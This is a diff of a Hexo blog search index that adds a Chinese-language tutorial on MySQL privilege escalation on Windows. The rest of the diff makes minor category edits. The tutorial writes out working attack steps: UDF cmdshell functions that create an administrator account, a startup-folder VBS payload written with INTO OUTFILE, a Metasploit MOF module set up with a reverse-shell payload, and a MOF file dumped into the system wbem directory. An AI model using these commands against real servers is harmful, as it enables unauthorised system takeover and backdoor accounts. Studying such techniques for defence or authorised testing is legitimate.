@@ -1,6 +1,117 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>数据库漏洞与提权</title>
+    <url>/2020/03/17/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%BC%8F%E6%B4%9E%E4%B8%8E%E6%8F%90%E6%9D%83/</url>
+    <content><![CDATA[<p>数据库漏洞与提权</p>
+<p>MySQL提权</p>
+<ul>
+<li><p>Mysql提权基础</p>
+</li>
+<li><p>UDF提权</p>
+<p>最广泛，成功率也应该是最高的</p>
+</li>
+<li><p>启动项提权</p>
+</li>
+<li><p>MOF提权</p>
+</li>
+</ul>
+<a id="more"></a>
+
+<ol>
+<li><p>Mysql提权基础</p>
+<p>权限要求：</p>
+<p>​    root权限</p>
+<p>默认配置文件位置：</p>
+<p>​    dedecms     data/common.inc.php</p>
+<p>​    discuz           config/config_global_default.php</p>
+<p>​                          config/config_ucenter.php</p>
+<p>​                          config.inc.php</p>
+<p>​    一些CMS的默认的配置文件路径，列几个，</p>
+<p>原理：</p>
+<p>​    一般都是在Windows下边用Mysql来提权。利用Mysql的root权限来给系统创建一个用户并且加入到管理员组。</p>
+</li>
+<li><p>UDF提权</p>
+<p>UDF为User Defined Function–用户自定义函数也就是支持用户自定义函数的功能</p>
+<p>原理：</p>
+<p>​    通过root权限导出udf.dll到系统目录下，可以通过udf.dll调用执行cmd</p>
+<p>步骤： </p>
+<ol>
+<li><p>获取root账户密码</p>
+</li>
+<li><p>上传udf提权脚本</p>
+</li>
+<li><p>导出udf.dll到mysql安装目录\lib\plugin\</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create function cmdshell returns string soname &#39;udf.dll&#39;;</span><br><span class="line"></span><br><span class="line">select cmdshell(&#39;net user abc abc &#x2F;add&#39;);</span><br><span class="line"></span><br><span class="line">select cmdshell(&#39;net localgroup administrators abc &#x2F;add&#39;);</span><br><span class="line"></span><br><span class="line">drop function cmdshell;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+</li>
+<li><p>启动项提权</p>
+<p>原理：</p>
+<p>​    将创建用户，添加到管理员组等命令写入到数据表中，并导入启动项。等系统重启后命令生效</p>
+<p>步骤：</p>
+<ol>
+<li><p>查看数据库中有什么数据表(show tables)</p>
+</li>
+<li><p>在test数据库中创建一个新的表，如创建表a，只设置一个字段用来存放test文本</p>
+</li>
+<li><p>在表中插入以下语句：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> nito a <span class="keyword">values</span>(<span class="string">'set wshshell=createobject("wscript.shell")'</span>)</span><br><span class="line"><span class="keyword">insert</span> nito a <span class="keyword">values</span>(<span class="string">'a=wshshell.run("cmd.exe /c net user test test /add",0)'</span>)</span><br><span class="line"><span class="keyword">insert</span> nito a <span class="keyword">values</span>(<span class="string">'b=wshshell.run("cmd.exe /c net localgroup administrators test /add",0)'</span>)</span><br></pre></td></tr></table></figure>
+</li>
+<li><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> a <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动\\test.vbs'</span>;</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ol>
+</li>
+</ol>
+<pre><code>5. 重启</code></pre><ol start="4">
+<li><p>MOF提权</p>
+<p>MOF（托管对象格式）</p>
+<ol>
+<li><p>msf中实现步骤</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/windows/mysql/mysql_mof</span><br><span class="line">set password xxx</span><br><span class="line">set username xxx</span><br><span class="line">set rhost xxx</span><br><span class="line">set rport xxx</span><br><span class="line">set payload windows/shell_reverse_tcp</span><br><span class="line">set lhost xxx</span><br><span class="line">set lport xxx</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ol>
+</li>
+</ol>
+<ol start="2">
+<li><p>手动上传mof.php</p>
+<ol>
+<li>上传mof.php</li>
+<li>访问该页面</li>
+<li>输入数据库账号密码</li>
+<li>进入后先点exploit然后输入命令执行（可以用&amp;&amp;把创建用户和加入管理员组命令放在一起执行）</li>
+</ol>
+</li>
+<li><p>上传nullevt.mof</p>
+<ol>
+<li><p>执行</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">load_file</span>(<span class="string">'C:\\RECYCLER\nullevt.mof'</span>) <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">'C:/windows/system32/wbem/mof/nullevt.mof'</span></span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ol>
+</li>
+</ol>
+<pre><code>2. 每隔分钟尝试执行添加用户为管理员</code></pre>]]></content>
+      <categories>
+        <category>WEB渗透</category>
+        <category>Mysql</category>
+        <category>提权</category>
+      </categories>
+      <tags>
+        <tag>Mysql</tag>
+        <tag>提权</tag>
+        <tag>WEB渗透</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>getshell后的一些常用命令</title>
     <url>/2020/02/27/getshell%E5%90%8E%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
     <content><![CDATA[<p>通过骚操作get到目标机的shell后，对其进一步利用…..</p>
@@ -103,7 +214,7 @@
 </ul>
 ]]></content>
       <categories>
-        <category>-[getshell,cmd,命令]</category>
+        <category>-getshell -cmd -命令</category>
       </categories>
       <tags>
         <tag>getshell</tag>
@@ -452,6 +563,10 @@ A --> E("require_once()")</pre>
 
 <p><img src="https://image.cpolo.cn/hexo%E5%8D%87%E7%BA%A7/success.png-cpolo.cn" alt="Success"></p>
 ]]></content>
+      <categories>
+        <category>Blog</category>
+        <category>日常维护</category>
+      </categories>
       <tags>
         <tag>hexo</tag>
         <tag>npm</tag>
